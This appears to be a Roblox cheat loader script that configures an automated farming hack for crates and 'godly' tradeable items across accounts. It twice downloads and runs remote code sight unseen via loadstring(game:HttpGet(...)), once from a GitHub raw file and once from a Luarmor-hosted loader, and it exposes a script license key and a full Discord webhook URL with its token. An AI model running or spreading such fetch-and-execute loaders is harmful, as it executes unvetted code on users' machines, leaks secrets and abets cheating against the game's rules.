getgenv().daubuoi = true

task.delay(1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/chuicuto123/hibe/refs/heads/main/checkitem.lua"))()
end)

script_key = "dfOqNvpsIboexIqvRfGBhlinaFOKEbVx"
getgenv().Config = {
    LOCK_FPS = 5,
    FARM_MODE = "Crate", -- BattlePass / Crate
    AUTO_RESTART_WHEN_UPDATE = true,
    HOP_WHEN_COIN_EARNED_LOWER = 200,
    TIME_TO_CHECK_COIN_EARNED = 1800,
    DISPLAY_UI = true,
    WEBHOOK_URL = "https://discord.com/api/webhooks/1561804659855855757/1GNuJIl2KuutxTuBVCiQDLRhR_GxgDT7fd4zwqWocboyQQf9MCtmAy0kHJpWLpGG0caW",
    WEBHOOK_NOTE = "",
    AUTO_CHANGE = { -- Auto change when account cant farm shells
        WAIT_UNTIL_LEVEL_10_WHEN_HAVE_GODLY_ITEMS = true, -- If account have godly items, wait until level 10 to change [because level 10 is required to trade items]
        YUMMY_TOOL = {
            ENABLED = false
        },
        MOUSE_TOOL = {
            ENABLED = false
        },
        FARM_SYNC = {
            ENABLED = false,
            HAVE_GODLY = { -- folder change when have godly items
                FOLDER_FROM = "have_godly_folder_id_from",
                FOLDER_TO = "have_godly_folder_id_to",
            },
            CHANGE_WITHOUT_REPLACE = false -- true / false
        },
        FARMERV5 = {
            ENABLED = false,
            API_KEY = "",
            OPTIONS = {
                HAVE_GODLY = 1, -- Option when account have godly
            }
        }
    }
}

task.spawn(function()
    local LastCheck = tick()
    while task.wait() do
        if getgenv().ScriptLoaded then
            break
        end

        pcall(function()
            if LastCheck + 180 <= tick() then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
            end
        end)
    end
end)

loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/31030ac78b61a55b198c34eba73462d1.lua"))()
